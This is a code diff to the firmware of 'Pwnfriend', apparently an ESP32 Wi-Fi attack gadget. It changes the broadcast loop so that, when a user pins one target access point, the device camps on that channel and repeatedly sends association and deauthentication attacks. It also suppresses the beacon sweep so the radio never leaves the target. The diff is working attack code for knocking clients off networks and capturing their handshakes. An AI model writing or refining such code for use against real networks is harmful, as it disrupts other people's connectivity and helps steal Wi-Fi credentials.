@@ -583,11 +583,20 @@ void Pwnfriend::broadcast() {
 
     // --- run the recon/attack epoch machine to pick the channel we park on ---
     if (_pinned_channel > 0) {
-        // pinned channel: camp on it, listen, re-attack once per dwell in active mode.
+        // pinned channel (user targeted/tuned one AP): camp on it and hammer like an attack
+        // dwell -- full assoc+deauth pass periodically, deauth re-kicks between -- instead of
+        // only once per recon window. the all-channel advert sweep is suppressed below so the
+        // radio actually stays put.
         _cur_channel = (uint8_t)_pinned_channel;
-        if ((_assoc_policy || _deauth_policy) && now - _last_active_ms >= HOP_RECON_TIME_MS) {
-            _last_active_ms = now;
-            attackChannel(_cur_channel);
+        if (_assoc_policy || _deauth_policy) {
+            if (now - _last_active_ms >= HOP_RECON_TIME_MS) {
+                _last_active_ms = now;
+                _last_deauth_ms = now;
+                attackChannel(_cur_channel);
+            } else if (_deauth_policy && now - _last_deauth_ms >= DEAUTH_REPEAT_MS) {
+                _last_deauth_ms = now;
+                deauthChannelPass(_cur_channel);
+            }
         }
     } else if (_phase == PHASE_RECON) {
         // sweep every channel gathering APs and being heard. recon_time doubles while inactive.
@@ -649,7 +658,9 @@ void Pwnfriend::broadcast() {
     // every ADVERTISE_SWEEP_MS spray the advert across ALL channels (2 beacons each, ~1ms
     // settle) then return to _cur_channel; between sweeps just beacon on _cur_channel.
     uint32_t sweep_ms = _saver ? ADVERTISE_SWEEP_SAVER_MS : ADVERTISE_SWEEP_MS;
-    if (now - _last_sweep_ms >= sweep_ms) {
+    // when pinned to a target, DON'T spray beacons across all channels -- that hop is the only
+    // thing that would leave the target channel. stay put; social reach yields to the focused hunt.
+    if (_pinned_channel <= 0 && now - _last_sweep_ms >= sweep_ms) {
         _last_sweep_ms = now;
         for (uint8_t h = 0; h < NUM_HOP_CHANNELS; h++) {
             esp_wifi_set_channel(HOP_CHANNELS[h], WIFI_SECOND_CHAN_NONE);
